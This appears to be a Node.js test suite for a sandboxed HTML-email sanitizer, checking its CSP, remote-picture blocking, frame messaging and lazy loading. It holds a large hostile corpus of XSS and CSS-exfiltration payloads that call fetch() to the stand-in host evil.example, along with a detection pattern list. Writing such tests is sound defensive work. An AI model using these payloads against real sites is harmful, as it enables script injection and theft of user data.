#!/usr/bin/env node
// THE MAIL FRAME'S RULES (lane channel-rich, D2 — 2026-09-28; gate row `test-mail-frame`, fast).
// The owner: "gmail 这种富文本 html 内容似乎完全没有按照 html 渲染". A mail's text/html part is shown in a
// FULLY SANDBOXED frame whose srcdoc is built by PURE src/mail-frame.js; this suite holds those rules:
//
//  ① THE SANITIZER over a HOSTILE CORPUS (script in every syntax, meta refresh, base, form, object / embed /
//    iframe, srcdoc escapes, `</iframe>` / `</style>` breakouts, javascript: / data:text/html in every
//    attribute and every entity / whitespace spelling, SVG onload, MathML mXSS, CSS url() / @import /
//    image-set / expression exfiltration, `<a target=_top>`, attribute breakouts, comments, a 10 MB body,
//    1 000 pictures): the output carries NONE of them, reaches no host, and is a FIXED POINT (sanitizing
//    the output again changes nothing — a re-parse cannot grow a tag)
//  ② the formatted mail still reads: headings, emphasis, lists, tables, links (http(s) / mailto only),
//    inline styles without their url()s, a cid: picture as the data: the parent handed in
//  ③ REMOTE PICTURES: blocked (no src written, counted) until Show pictures; then https only; http never
//  ④ THE CSP string, exact; the srcdoc: the CSP meta FIRST, ONE script (ours, with its nonce)
//  ⑤ Show pictures: per message, remembered per SENDER (case-insensitive), never globally
//  ⑥ the parent's verdict: only THAT frame's window with THAT frame's token; a height clamped; a link opened
//    only when http(s) / mailto
//  ⑦ LAZY: at most LIVE_FRAME_CAP live frames, nearest first, nothing outside the keep zone (30 mails)
//  ⑧ WIRING PINS: the DOM half is the ONE srcdoc site and calls the rules in order; DOMPurify's config is
//    the module's; sandbox is `allow-scripts` only; NEVER `allow-same-origin` in any channel file
//  ⑨ CONTROLS (patched copies outside the tree): a sanitizer that keeps every attribute, and one that lets
//    <script> through, each go RED on ①
//  ⑩ (naive-user verify, 2026-09-28) THE QUOTED HISTORY + FIT TO WIDTH: the mail clients' own quote containers
//    (gmail_quote, blockquote type=cite, yahoo_quoted) are marked ONCE — the outermost — with `data-vs-quote`
//    (a bare <blockquote> is the author's and stays); DOMPurify keeps the mark; the frame hides a marked quote
//    until its button (the parent's words, escaped for a <script>) is pressed; the resizer zooms a wide mail to
//    the frame's width, re-judged only when the width changes; a patched copy without the mark goes RED
//  ⑫ (security verify r2, 2026-09-28) THE BODY IS BOUNDED AT THE BYTES: the route answered chunked with no
//    Content-Length, so round 1's header guard never engaged and the whole body (≤ 100 MB) was downloaded before it
//    was judged; `readBounded` stops at MAX_HTML_BYTES and cancels the stream; a copy without the bound reads 3 MB whole
//  ⑬ (security verify r2, 2026-09-28) A MAIL DOES NOT ANIMATE ITS ROW: @keyframes / animation-* / transition-*
//    stripped (the root) + the parent's PURE height budget (settle 1.5 s, then one change per 250 ms, a height that
//    flips 8× in 10 s is frozen — the belt); a copy keeping animations and a copy that never freezes go RED
//  ⑪ (security verify, 2026-09-28) BOUNDED WORK: every shape that made the sanitizer QUADRATIC (a tag with no
//    `>` to the end, an unterminated attribute quote, `<b<b<b…`, a dropped element's `<svg ` with no `>`, CSS quote
//    pairs with no newline, `url(` with no `)`, `@font-face{` with no `}`) at the module's OWN bound (MAX_HTML_BYTES)
//    finishes inside 1 500 ms — measured ≤ 165 ms, so ~9× slack; the pre-fix code took 15 s at 64 KB and hours at
//    the bound, freezing every tab that opened the conversation. CONTROLS: a patched copy restoring each old loop
//    is run under the SAME judge in a child process (cut at the budget, never waited for) and goes RED
import fs from 'node:fs';
import path from 'node:path';
import { createRequire } from 'node:module';
import { mutantCopies, copiesCensus } from './mutant-copy.mjs';
const require = createRequire(import.meta.url);
const REPO = path.resolve(new URL('..', import.meta.url).pathname);
let pass = 0, fail = 0;
const ok = (c, n, e) => { if (c) { pass++; console.log('  ✓ ' + n); } else { fail++; console.error('  ✗ ' + n + (e ? '\n    ' + String(e).slice(0, 600) : '')); } };
const J = JSON.stringify;
const MF = require(path.join(REPO, 'src/mail-frame.js'));

const EVIL = 'http://evil.example';
const EVIL_S = 'https://evil.example';
/** THE HOSTILE CORPUS — name → html. Every entry tries to run something or reach `evil.example`. */
const CORPUS = [
  ['script', `<p>hi</p><script>fetch('${EVIL}/1')</script>`],
  ['SCRIPT upper + attrs', `<SCRIPT type="text/javascript" SRC="${EVIL}/2.js"></SCRIPT>`],
  ['script unclosed', `<p>x</p><script>fetch('${EVIL}/3')`],
  ['script split name', `<scr<script>ipt>fetch('${EVIL}/4')</scr</script>ipt>`],
  ['script slash', `<script/xss src="${EVIL}/5.js"></script>`],
  ['script in noscript attr (mXSS)', `<noscript><p title="</noscript><img src=x onerror=fetch('${EVIL}/6')>"></noscript>`],
  ['img onerror', `<img src=x onerror="fetch('${EVIL}/7')">`],
  ['img onerror no quotes', `<img src=x onerror=fetch('${EVIL}/8')>`],
  ['body onload', `<body onload="fetch('${EVIL}/9')"><p>b</p></body>`],
  ['svg onload', `<svg onload="fetch('${EVIL}/10')"><circle r=1 /></svg>`],
  ['svg script', `<svg><script>fetch('${EVIL}/11')</script></svg>`],
  ['math mxss', `<math><mtext><table><mglyph><style><img src=x onerror="fetch('${EVIL}/12')"></style></mglyph></table></mtext></math>`],
  ['meta refresh', `<meta http-equiv="refresh" content="0;url=${EVIL}/13">`],
  ['base', `<base href="${EVIL}/"><a href="x">rel</a>`],
  ['link stylesheet', `<link rel=stylesheet href="${EVIL}/14.css">`],
  ['form', `<form action="${EVIL}/15" method=post><input name=a><button formaction="${EVIL}/16">go</button><textarea>t</textarea><select><option>o</option></select></form>`],
  ['iframe', `<iframe src="${EVIL}/17"></iframe>`],
  ['iframe srcdoc', `<iframe srcdoc="&lt;script&gt;fetch('${EVIL}/18')&lt;/script&gt;"></iframe>`],
  ['object/embed/applet', `<object data="${EVIL}/19"></object><embed src="${EVIL}/20"><applet code="${EVIL}/21"></applet>`],
  ['video/audio poster', `<video poster="${EVIL}/22" src="${EVIL}/23"></video><audio src="${EVIL}/24"></audio>`],
  ['iframe breakout', `</iframe><script>fetch('${EVIL}/25')</script>`],
  ['style breakout', `<style>p{color:red}</style><script>fetch('${EVIL}/26')</script></style>`],
  ['textarea breakout', `<textarea></textarea><script>fetch('${EVIL}/27')</script></textarea>`],
  ['title breakout', `<title></title><img src=x onerror=fetch('${EVIL}/28')></title>`],
  ['a javascript', `<a href="javascript:fetch('${EVIL}/29')">x</a>`],
  ['a javascript entity hex', `<a href="jav&#x61;script:fetch('${EVIL}/30')">x</a>`],
  ['a javascript entity dec no semicolon', `<a href="&#106avascript:fetch('${EVIL}/31')">x</a>`],
  ['a javascript tab', `<a href="java\tscript:fetch('${EVIL}/32')">x</a>`],
  ['a javascript entity tab', `<a href="jav&#x09;ascript:fetch('${EVIL}/33')">x</a>`],
  ['a javascript colon entity', `<a href="javascript&colon;fetch('${EVIL}/34')">x</a>`],
  ['a javascript leading space + case', `<a href="  JaVaScRiPt:fetch('${EVIL}/35')">x</a>`],
  ['a vbscript', `<a href="vbscript:msgbox('${EVIL}/36')">x</a>`],
  ['a data html', `<a href="data:text/html,<script>fetch('${EVIL}/37')</script>">x</a>`],
  ['a target top', `<a href="${EVIL_S}/ok" target="_top" ping="${EVIL}/38">x</a>`],
  ['img data svg', `<img src="data:image/svg+xml,<svg onload=fetch('${EVIL}/39')>">`],
  ['img srcset', `<img srcset="${EVIL}/40 1x, ${EVIL}/41 2x">`],
  ['background attr', `<table background="${EVIL}/42"><tr><td background="${EVIL}/43">x</td></tr></table>`],
  ['style attr url', `<div style="background:url(${EVIL}/44)">x</div>`],
  ['style attr url quoted + escapes', `<div style="background:u\\rl('${EVIL}/45')">x</div><div style="background:u\\rl(${EVIL}/45b)">x</div><div style="background-image:u&#114;l(${EVIL}/46)">y</div>`],
  ['style element url', `<style>body{background:url("${EVIL}/47")} @import url(${EVIL}/48.css); @import "${EVIL}/49.css";</style>`],
  ['style image-set', `<style>.a{background-image:image-set("${EVIL}/50" 1x)} .b{background:-webkit-image-set(url(${EVIL}/51) 1x)}</style>`],
  ['style expression / behavior / binding', `<div style="width:expression(fetch('${EVIL}/52'));behavior:url(${EVIL}/53.htc);-moz-binding:url(${EVIL}/54.xml)">x</div>`],
  ['style font-face', `<style>@font-face{font-family:x;src:url(${EVIL}/55.woff)}</style>`],
  ['style comment trick', `<style>body{background:url/**/(${EVIL}/56)}</style>`],
  ['attr breakout quote', `<img alt='"><script>fetch("${EVIL}/57")</script>'>`],
  ['attr breakout title entity', `<div title="&quot;&gt;&lt;script&gt;fetch('${EVIL}/58')&lt;/script&gt;">z</div>`],
  ['comment tricks', `<!--><script>fetch('${EVIL}/59')</script>--><!-- --!><script>fetch('${EVIL}/60')</script> -->`],
  ['cdata', `<![CDATA[<script>fetch('${EVIL}/61')</script>]]>`],
  ['processing instruction', `<?xml-stylesheet href="${EVIL}/62.xsl"?><p>pi</p>`],
  ['template', `<template><script>fetch('${EVIL}/63')</script></template>`],
  ['xmp / plaintext', `<xmp><script>fetch('${EVIL}/64')</script></xmp><plaintext><script>fetch('${EVIL}/65')</script>`],
  ['xlink', `<a xlink:href="javascript:fetch('${EVIL}/66')">x</a>`],
  ['id / name clobbering', `<img name="getElementById" id="cookie"><form name="parent"></form>`],
  ['uppercase ONLOAD + slash separator', `<img/src="x"/ONERROR="fetch('${EVIL}/67')">`],
  ['null byte in tag', `<scr\u0000ipt>fetch('${EVIL}/68')</scr\u0000ipt>`],
  ['remote img plain http tracker', `<img src="${EVIL}/69.gif" width=1 height=1>`],
  ['remote img https before pictures', `<img src="${EVIL_S}/70.png">`],
  ['dialog / portal', `<dialog open onclose="fetch('${EVIL}/71')">d</dialog><portal src="${EVIL}/72"></portal>`],
];
/** What the OUTPUT must never carry. */
const FORBIDDEN = [
  ['a <script', /<\s*script/i], ['an on* attribute', /\s[a-z-]*on[a-z]+\s*=/i], ['javascript:', /javascript\s*:/i], ['vbscript:', /vbscript\s*:/i],
  ['data:text/html', /data:\s*text/i], ['data:image/svg', /data:image\/svg/i],
  ['a dangerous element', /<\s*(iframe|object|embed|applet|form|input|button|textarea|select|meta|base|link|svg|math|video|audio|template|frame|noscript|xmp|plaintext|dialog|portal|title)\b/i],
  ['srcset / background / poster / action / ping / xlink / target / id / name', /\s(srcset|background|poster|action|formaction|ping|xlink:href|target|id|name)\s*=/i],
  ['@import', /@import/i], ['expression(', /expression\s*\(/i], ['image-set(', /image-set\s*\(/i], ['behavior / -moz-binding', /behavior\s*:|-moz-binding/i],
  ['a url( to anything but a data: picture', /url\s*\(\s*(?!["']?data:image\/(png|jpeg|gif|webp|bmp);base64,)/i],
  // the host as WORDS is inert (a text node) and a LINK to any https site is the person's click (the parent re-judges
  // it) — what may never reach the attacker is a LOAD: a picture's src, a style, a style sheet
  ['a load from the attacker\'s host', /\s(src|style)="[^"]*evil\.example|<style>[^<]*evil\.example/i],
];
const scan = (html) => FORBIDDEN.filter(([, re]) => re.test(html)).map(([n]) => n);

// ── ① THE HOSTILE CORPUS ─────────────────────────────────────────────────
console.log('① the sanitizer over the hostile corpus');
const runCorpus = (mf, opts = {}) => {
  const bad = [];
  for (const [name, html] of CORPUS) {
    const r = mf.sanitizeMailHtml(html, opts);
    const hits = r.ok ? scan(r.html) : [];
    if (hits.length) bad.push(`${name}: ${hits.join(', ')} ⇒ ${r.html.slice(0, 160)}`);
    const again = r.ok ? mf.sanitizeMailHtml(r.html, opts) : null;
    // (the blocked-picture marker is WRITTEN by the sanitizer, never accepted from a mail — the one byte a second pass drops)
    const unmark = (x) => x.replace(/ data-vs-blocked="1"/g, '');
    if (again && unmark(again.html) !== unmark(r.html)) bad.push(`${name}: NOT a fixed point ⇒ ${r.html.slice(0, 80)} … ${again.html.slice(0, 80)}`);
  }
  return bad;
};
{
  const bad = runCorpus(MF);
  ok(!bad.length, `${CORPUS.length} hostile mails: the output carries no script, no handler, no dangerous element or attribute, no javascript:/data:text, no CSS reach, never the attacker's host — and re-sanitizing it changes nothing`, bad.join('\n    '));
  const badPics = runCorpus(MF, { pictures: true });
  ok(!badPics.filter((b) => !/70\.png/.test(b)).length, 'the same with Show pictures pressed — only an https picture\'s own src may appear (the http tracker never)', badPics.join('\n    '));
  const withPics = MF.sanitizeMailHtml(`<img src="${EVIL_S}/70.png"><img src="${EVIL}/69.gif">`, { pictures: true });
  ok(/src="https:\/\/evil\.example\/70\.png"/.test(withPics.html) && !/69\.gif/.test(withPics.html), 'Show pictures: an https picture gets its src, an http one never (the CSP would not load it either)', withPics.html);
  const t0 = Date.now();
  const huge = MF.sanitizeMailHtml('<p>' + 'x'.repeat(10 * 1024 * 1024) + '</p>');
  ok(huge.ok === false && huge.code === 'too-large' && Date.now() - t0 < 1500, `a 10 MB body is REFUSED BY NAME (too-large — the plain text is shown), in ${Date.now() - t0} ms`, JSON.stringify({ ok: huge.ok, code: huge.code }));
  const t1 = Date.now();
  const many = MF.sanitizeMailHtml(Array.from({ length: 1000 }, (_, i) => `<img src="data:image/png;base64,AAAA${i % 10}" alt="p${i}">`).join(''));
  const srcs = (many.html.match(/<img[^>]*\ssrc=/g) || []).length;
  ok(many.ok && srcs === MF.MAX_IMAGES && many.droppedImages === 1000 - MF.MAX_IMAGES && Date.now() - t1 < 1500, `1 000 pictures: ${srcs} kept (MAX_IMAGES), ${many.droppedImages} dropped and COUNTED, in ${Date.now() - t1} ms`);
  const t2 = Date.now();
  const deep = MF.sanitizeMailHtml('<div>'.repeat(20000) + 'deep' + '</div>'.repeat(20000));
  ok(deep.ok && (deep.html.match(/<div>/g) || []).length <= 512 && /deep/.test(deep.html) && Date.now() - t2 < 1500, `20 000 nested divs: the element stack is bounded (≤ 512 written), the words kept, in ${Date.now() - t2} ms`);
  const t3 = Date.now();
  const lt = MF.sanitizeMailHtml('<'.repeat(200000) + 'a' + ' x="'.repeat(20000));
  ok(lt.ok && !/<[a-z]/i.test(lt.html) && Date.now() - t3 < 1500, `200 000 bare "<" and an unterminated attribute run: text, linear (${Date.now() - t3} ms)`);
}

// ── ② the mail still reads ───────────────────────────────────────────────
console.log('② a formatted mail keeps its formatting');
{
  const html = '<html><head><title>T</title><style>.big{font-size:20px;color:#333} td{padding:4px}</style></head><body bgcolor="#fff">'
    + '<h1>Weekly</h1><p class="big">Hello <b>team</b> and <i>friends</i> — <a href="https://docs.example/q3?x=1&amp;y=2">the report</a>, <a href="mailto:ops@example.com">mail us</a>.</p>'
    + '<ul><li>one</li><li>two</li></ul><table border="1" cellpadding="3"><tr><td colspan="2" style="color:red;background:#eee">cell</td></tr></table>'
    + '<img alt="logo" src="cid:logo@x" width="8"><p>&copy; 2026 &mdash; ok</p></body></html>';
  const r = MF.sanitizeMailHtml(html, { cid: { 'logo@x': 'data:image/png;base64,iVBORw0KGgo=' } });
  ok(/<h1>Weekly<\/h1>/.test(r.html) && /<b>team<\/b>/.test(r.html) && /<i>friends<\/i>/.test(r.html) && /<ul><li>one<\/li><li>two<\/li><\/ul>/.test(r.html), 'headings, emphasis and lists survive', r.html);
  ok(/<a href="https:\/\/docs\.example\/q3\?x=1&amp;y=2">the report<\/a>/.test(r.html) && /<a href="mailto:ops@example\.com">/.test(r.html) && r.links === 2, 'links: http(s) and one-address mailto kept (href re-quoted, & escaped)', r.html);
  ok(/<table border="1" cellpadding="3"><tr><td colspan="2" style="color:red;background:#eee">cell<\/td><\/tr><\/table>/.test(r.html), 'tables and their layout attributes + a url-free inline style kept');
  ok(/<style>\.big\{font-size:20px;color:#333\} td\{padding:4px\}<\/style>/.test(r.html) && !/<title>/.test(r.html) && !/<html|<head|<body/.test(r.html), 'a head <style> kept (sanitized), <title>/<html>/<head>/<body> unwrapped');
  ok(/<img alt="logo" src="data:image\/png;base64,iVBORw0KGgo=" width="8">/.test(r.html) && r.remoteImages === 0, 'a cid: picture becomes the data: picture the parent fetched through OUR route', r.html);
  ok(/&copy; 2026 &mdash; ok/.test(r.html), 'entities in text pass through (the browser decodes them — as text)');
  const miss = MF.sanitizeMailHtml('<img src="cid:gone@x">', { cid: {} });
  ok(miss.cidMissing.join() === 'gone@x' && !/src=/.test(miss.html), 'a cid: the parent could not resolve is dropped and NAMED (cidMissing)');
  ok(MF.cidRefs('<img src="cid:a@x"><IMG SRC=cid:b@y><img src=\'cid:a@x\'>').join() === 'a@x,b@y', 'cidRefs: the Content-IDs a mail names, once each');
}

// ── ③ remote pictures ────────────────────────────────────────────────────
console.log('③ remote pictures are blocked until Show pictures');
{
  const html = `<p>x</p><img alt="r" src="https://img.example/p.png"><img src="http://track.example/t.gif"><img src="data:image/gif;base64,R0lGOD">`;
  const off = MF.sanitizeMailHtml(html);
  ok(off.remoteImages === 2 && off.blockedImages === 2 && !/img\.example|track\.example/.test(off.html) && (off.html.match(/data-vs-blocked="1"/g) || []).length === 2 && /src="data:image\/gif/.test(off.html), 'OFF: no remote src is WRITTEN (two blocked, counted, marked), an inline data: picture drawn', off.html);
  const on = MF.sanitizeMailHtml(html, { pictures: true });
  ok(/src="https:\/\/img\.example\/p\.png"/.test(on.html) && !/track\.example/.test(on.html) && on.blockedImages === 0, 'ON: the https picture gets its src; the http tracker never', on.html);
  const tbl = [
    ['https', 'https://a.example/x.png', false, 'blocked'], ['https on', 'https://a.example/x.png', true, 'src'], ['http on', 'http://a.example/x.png', true, 'drop'],
    ['javascript', 'javascript:alert(1)', true, 'drop'], ['data svg', 'data:image/svg+xml,<svg/>', true, 'drop'], ['data png', 'data:image/png;base64,AAAA', false, 'src'],
    ['userinfo', 'https://u:p@a.example/x.png', true, 'drop'], ['relative', '/api/x', true, 'drop'], ['file', 'file:///etc/passwd', true, 'drop'],
  ];
  const got = tbl.map(([n, u, pics, want]) => { const v = MF.imageSrcVerdict(u, { pictures: pics }); const k = v.src ? 'src' : v.blocked ? 'blocked' : 'drop'; return k === want ? null : `${n}: ${k} ≠ ${want}`; }).filter(Boolean);
  ok(!got.length, 'imageSrcVerdict table (https blocked → src after the press; http / javascript / svg / userinfo / relative / file dropped; a data: raster kept)', got.join('; '));
}

// ── ④ the CSP + the srcdoc ───────────────────────────────────────────────
console.log('④ the CSP and the frame document');
{
  ok(MF.cspFor({ nonce: 'abc' }) === "default-src 'none'; img-src data:; style-src 'unsafe-inline'; font-src data:; script-src 'nonce-abc'; base-uri 'none'; form-action 'none'; frame-src 'none'; connect-src 'none'; media-src 'none'; object-src 'none'", 'the CSP, exact (pictures off)', MF.cspFor({ nonce: 'abc' }));
  ok(MF.cspFor({ nonce: 'abc', pictures: true }) === "default-src 'none'; img-src data: https:; style-src 'unsafe-inline'; font-src data:; script-src 'nonce-abc'; base-uri 'none'; form-action 'none'; frame-src 'none'; connect-src 'none'; media-src 'none'; object-src 'none'", 'the CSP, exact (Show pictures: + https: to img-src, that frame only)');
  ok(MF.cspFor({ nonce: "x' 'unsafe-inline" }).includes("'nonce-xunsafe-inline'"), 'a nonce is its own alphabet — a quote cannot widen the policy');
  const body = MF.sanitizeMailHtml(CORPUS.map((c) => c[1]).join('')).html;
  const doc = MF.composeSrcdoc({ body, nonce: 'n0nce', token: 'tok1', pictures: false });
  const cspAt = doc.indexOf('Content-Security-Policy'), bodyAt = doc.indexOf('<body>');
  ok(cspAt > 0 && cspAt < doc.indexOf('<style>') && cspAt < bodyAt, 'the CSP <meta> comes FIRST (it governs only what follows it)');
  ok((doc.match(/<script/gi) || []).length === 1 && /<script nonce="n0nce">/.test(doc) && doc.lastIndexOf('<script') > bodyAt, 'the frame carries exactly ONE script — ours, with the nonce, after the body');
  ok(/vsMail:T/.test(MF.resizerScript('tok1')) && /"tok1"/.test(MF.resizerScript('tok1')) && MF.resizerScript('a"b</script>').includes('"ab/script"') === false && !/<\/script/i.test(MF.resizerScript('</script>')), 'the resizer posts with the frame\'s token; a token is its own alphabet (no </script> can be spelled into it)');
}

// ── ⑤ Show pictures: per message, per sender ─────────────────────────────
console.log('⑤ Show pictures: this message, this sender, this session');
{
  const st = MF.picturesState();
  ok(!MF.picturesShown(st, { vendorId: 'm1', sender: 'a@x' }), 'nothing is shown before a press');
  MF.showPictures(st, { vendorId: 'm1', sender: 'A@X' });
  const rows = [[{ vendorId: 'm1', sender: 'z@z' }, true], [{ vendorId: 'm2', sender: 'a@x' }, true], [{ vendorId: 'm3', sender: 'b@x' }, false], [{ vendorId: 'm3', sender: '' }, false]];
  ok(rows.every(([q, want]) => MF.picturesShown(st, q) === want), 'the pressed message, and every message of its SENDER (case-insensitive), never another sender\'s', JSON.stringify(rows.map(([q]) => MF.picturesShown(st, q))));
  ok(MF.picturesShown(MF.picturesState(), { vendorId: 'm1', sender: 'a@x' }) === false, 'a new session (a new state) remembers nothing — the press is never stored or global');
}

// ── ⑥ the parent's verdict on a message ──────────────────────────────────
console.log('⑥ the parent trusts one clamped number from THAT frame');
{
  const W = {}, OTHER = {};
  const cases = [
    [{ source: OTHER, frameWindow: W, token: 't', data: { vsMail: 't', h: 300 } }, 'ignore'],
    [{ source: W, frameWindow: W, token: 't', data: { vsMail: 'x', h: 300 } }, 'ignore'],
    [{ source: W, frameWindow: W, token: 't', data: { h: 300 } }, 'ignore'],
    [{ source: W, frameWindow: W, token: 't', data: { vsMail: 't', h: 300 } }, 'height:300'],
    [{ source: W, frameWindow: W, token: 't', data: { vsMail: 't', h: 1e9 } }, `height:${MF.HEIGHT_MAX}`],
    [{ source: W, frameWindow: W, token: 't', data: { vsMail: 't', h: -5 } }, `height:${MF.HEIGHT_MIN}`],
    [{ source: W, frameWindow: W, token: 't', data: { vsMail: 't', h: 'NaN' } }, 'ignore'],
    [{ source: W, frameWindow: W, token: 't', data: { vsMail: 't', open: 'javascript:alert(1)' } }, 'ignore'],
    [{ source: W, frameWindow: W, token: 't', data: { vsMail: 't', open: 'jav&#x61;script:x' } }, 'ignore'],
    [{ source: W, frameWindow: W, token: 't', data: { vsMail: 't', open: 'https://ok.example/a' } }, 'open:https://ok.example/a'],
    [{ source: W, frameWindow: W, token: 't', data: { vsMail: 't', open: 'mailto:a@b.example?bcc=c@d.example' } }, 'ignore'],
    [{ source: W, frameWindow: W, token: '', data: { vsMail: '', h: 10 } }, 'ignore'],
  ];
  const out = cases.map(([q]) => { const v = MF.frameMessageVerdict(q); return v.act === 'height' ? `height:${v.h}` : v.act === 'open' ? `open:${v.href}` : 'ignore'; });
  ok(out.every((x, i) => x === cases[i][1]), 'another window (a spoofing frame), a wrong or missing token, a non-number, a javascript:/entity/hfield href — ignored; a height clamped; an http(s) link opened', JSON.stringify(out));
}

// ── ⑦ lazy frames ────────────────────────────────────────────────────────
console.log('⑦ frames are lazy: nearest first, capped, only inside the keep zone');
{
  const rows = Array.from({ length: 30 }, (_, i) => ({ id: `m${i}`, top: i * 100, bottom: i * 100 + 90 }));
  // A VISIBLE MAIL IS NEVER A BLANK BOX (security verify r2, continued): 7 rows (m10–m16) intersect the view
  const live = MF.liveFrames(rows, { top: 1000, bottom: 1600 });
  ok(live.length === 7 && live.join() === 'm10,m11,m12,m13,m14,m15,m16', `30 mails, 7 of them on screen: all 7 visible rows are live (more than LIVE_FRAME_CAP ${MF.LIVE_FRAME_CAP} — the cap never blanks a visible mail), none pre-warmed`, live.join(','));
  const few = MF.liveFrames(rows, { top: 1000, bottom: 1250 });
  ok(few.length === MF.LIVE_FRAME_CAP && few.slice(0, 3).join() === 'm10,m11,m12' && few.slice(3).every((id) => ['m9', 'm13', 'm8', 'm14'].includes(id)), `3 rows on screen: the 3 visible, then the keep zone's NEAREST pre-warmed up to the cap (${few.join(',')})`, few.join(','));
  const shorts = Array.from({ length: 16 }, (_, i) => ({ id: `s${i}`, top: i * 70, bottom: i * 70 + 64 }));
  const tail = MF.liveFrames(shorts, { top: 1120 - 812, bottom: 1120 });
  ok(['s10', 's11', 's12', 's13', 's14', 's15'].every((id) => tail.includes(id)) && tail.filter((id) => { const r = shorts.find((x) => x.id === id); return r.bottom >= 1120 - 812 && r.top <= 1120; }).length === shorts.filter((r) => r.bottom >= 1120 - 812 && r.top <= 1120).length, `the measured chrome shape — 16 short replies, the reader at the tail of an 812 px list: every row on screen is live, the NEWEST included (${tail.join(',')})`, tail.join(','));
  const far = MF.liveFrames([{ id: 'a', top: 10000, bottom: 10100 }, { id: 'b', top: 500, bottom: 600 }], { top: 0, bottom: 400 });
  ok(far.join() === 'b', 'a row beyond the keep zone is never live; one inside it is', far.join());
  ok(MF.liveFrames(rows, { top: 0, bottom: 95 }, { cap: 0 }).join() === 'm0' && MF.liveFrames(null, null).length === 0, 'cap 0 ⇒ only the rows on screen (nothing pre-warmed); nothing ⇒ nothing');
  // CONTROL: the round-1 verdict (the cap sliced the sorted list, visible rows included) blanks visible mails
  {
    const Mv = mutantCopies('mail-frame-lazy', REPO);
    const srcL = fs.readFileSync(path.join(REPO, 'src/mail-frame.js'), 'utf-8');
    const oldLazy = srcL.replace("  const visible = near.filter((x) => x.d === 0);\n  const warm = near.filter((x) => x.d > 0).slice(0, Math.max(0, Math.max(0, cap) - visible.length));\n  return [...visible, ...warm].map((x) => x.id);", "  return near.slice(0, Math.max(0, cap)).map((x) => x.id);");
    const ml = Mv.load('src/mail-frame.js', oldLazy, 'cap-cuts-visible');
    const oldLive = ml.liveFrames(rows, { top: 1000, bottom: 1600 });
    ok(oldLazy !== srcL && oldLive.length === MF.LIVE_FRAME_CAP && !oldLive.includes('m16'), `CONTROL: the round-1 verdict keeps ${oldLive.length} of the 7 visible rows — a visible mail left a blank box (${oldLive.join(',')})`, oldLive.join(','));
    for (const c of copiesCensus(Mv.files, Mv.dir, REPO, { minCopies: 1 })) ok(c.pass, c.name, c.detail);
  }
  ok(MF.bodyAttachmentOf({ attachments: [{ id: 'a', mime: 'image/png' }, { id: 'b', mime: 'text/html', role: 'body' }] }).id === 'b' && MF.bodyAttachmentOf({ attachments: [{ id: 'c', mime: 'text/html' }] }) === null, 'the formatted body is the `role: body` text/html attachment — an attached .html FILE is a file');
}

// ── ⑧ wiring pins ────────────────────────────────────────────────────────
console.log('⑧ wiring: the ONE srcdoc site and its order');
{
  const strip = (src) => src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s*\/\/.*$/gm, '');
  const dom = strip(fs.readFileSync(path.join(REPO, 'src/lib/channel-mail-frame.js'), 'utf-8'));
  const at = (re) => { const m = re.exec(dom); return m ? m.index : -1; };
  const s1 = at(/MF\.sanitizeMailHtml\(/), s2 = at(/DOMPurify\.sanitize\(pure\.html, \{ \.\.\.MF\.DOMPURIFY_CONFIG/), s3 = at(/MF\.composeSrcdoc\(/), s4 = at(/f\.srcdoc = doc;/);
  ok(s1 > 0 && s2 > s1 && s3 > s2 && s4 > s3, 'the DOM half runs step 1 (our sanitizer) → step 2 (DOMPurify with the module\'s config) → step 3 (composeSrcdoc) → the srcdoc', JSON.stringify({ s1, s2, s3, s4 }));
  ok((dom.match(/\.srcdoc\s*=/g) || []).length === 1 && /f\.setAttribute\('sandbox', 'allow-scripts'\);/.test(dom) && !/allow-same-origin|allow-popups|allow-forms|allow-top-navigation|allow-modals/.test(dom), 'ONE srcdoc assignment; sandbox = "allow-scripts" and nothing else');
  // THE FRAME'S ORDER (security verify r2, continued): sandbox flags bind at NAVIGATION and a srcdoc document inherits
  // the PARENT's origin — so the flags must be on the element before the srcdoc is set and before it is inserted,
  // else the mail's first document runs unsandboxed in VibeSpace's own origin. Created fresh per live frame.
  const orderOf = (code) => {
    const i0 = code.indexOf("const f = document.createElement('iframe');"), i1 = code.indexOf("f.setAttribute('sandbox', 'allow-scripts');"), i2 = code.indexOf('f.srcdoc = doc;'), i3 = code.indexOf('s.box.replaceChildren(f);');
    const between = i0 >= 0 && i3 > i0 ? code.slice(i0, i3) : '';
    return i0 >= 0 && i1 > i0 && i2 > i1 && i3 > i2 && !/appendChild\(f\)|replaceChildren\(f\)|insertBefore\(f|\.append\(f\)/.test(between) && (code.match(/document\.createElement\('iframe'\)/g) || []).length === 1;
  };
  ok(orderOf(dom), 'the frame is CREATED fresh, sandboxed, THEN given its srcdoc, THEN inserted — never inserted or navigated before its flags');
  const lateSandbox = dom.replace("    f.setAttribute('sandbox', 'allow-scripts');\n", '').replace('    s.box.replaceChildren(f);\n', "    s.box.replaceChildren(f);\n    f.setAttribute('sandbox', 'allow-scripts');\n");
  const earlyInsert = dom.replace('    f.srcdoc = doc;\n', "    s.box.appendChild(f);\n    f.srcdoc = doc;\n");
  ok(lateSandbox !== dom && earlyInsert !== dom && !orderOf(lateSandbox) && !orderOf(earlyInsert), 'NEGATIVE CONTROLS: the sandbox set after the insertion, or the frame inserted before its srcdoc, are both flagged');
  ok(/MF\.frameMessageVerdict\(\{ source: e\.source, frameWindow: s\.frame\.contentWindow, token: s\.token, data: e\.data \}\)/.test(dom) && /window\.open\(v\.href, '_blank', 'noopener,noreferrer'\)/.test(dom), 'the message listener asks the PURE verdict with the event\'s source and THAT frame\'s window; a link opens with no opener');
  ok(/MF\.liveFrames\(/.test(dom) && /new IntersectionObserver\(/.test(dom) && /signal: signal \|\| undefined/.test(dom), 'lazy frames: the PURE verdict over an IntersectionObserver; every listener on the window\'s controller');
  ok(!/innerHTML|outerHTML|insertAdjacentHTML|document\.write/.test(dom), 'the DOM half writes no HTML anywhere else');
  const mfSrc = strip(fs.readFileSync(path.join(REPO, 'src/mail-frame.js'), 'utf-8'));
  ok(!/\brequire\(|\bimport\s/.test(mfSrc), 'src/mail-frame.js imports NOTHING (PURE — the bundle and this suite take the same rules)');
  const cfg = MF.DOMPURIFY_CONFIG;
